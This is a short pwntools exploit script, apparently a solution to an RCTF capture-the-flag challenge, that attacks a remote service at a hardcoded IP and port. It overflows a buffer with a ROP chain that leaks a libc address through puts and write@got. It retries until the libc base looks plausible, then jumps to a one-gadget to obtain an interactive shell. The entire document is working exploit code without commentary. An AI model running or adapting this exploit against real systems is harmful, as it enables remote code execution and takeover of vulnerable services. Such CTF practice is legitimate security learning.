from pwn import *
import time
elf = ELF("./chall")
context.binary=elf
#context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

main=0x4007CD
puts_plt=0x4005a0
write_got=0x601020
poprdi=0x00000000004008a3
payload="A"*0x10+p64(0)*3
ropchain=p64(poprdi)+p64(write_got)+p64(puts_plt)+p64(main)
payload+=ropchain*31
while(True):
	target=remote('220.249.52.134',36371)
	#target=process([elf.path])
	sa("Welcome to RCTF\n",payload)
	libc_strcmp=0
	try:
		target.recvuntil("A"*0x10)
		libc_base=u64(target.recv(6).ljust(8,"\x00"))-0x0f72b0
		print("[+]libc_base="+hex(libc_base))
	except:
		target.close()
		continue
	if(libc_base>0x7f0000000000):
		break
	else:
		target.close()
		continue

gadget=0x4526a
libc_gadget=libc_base+gadget
payload="A"*0x18+p64(libc_gadget)+p64(0)*30
sa("Welcome to RCTF\n",payload)
target.interactive()
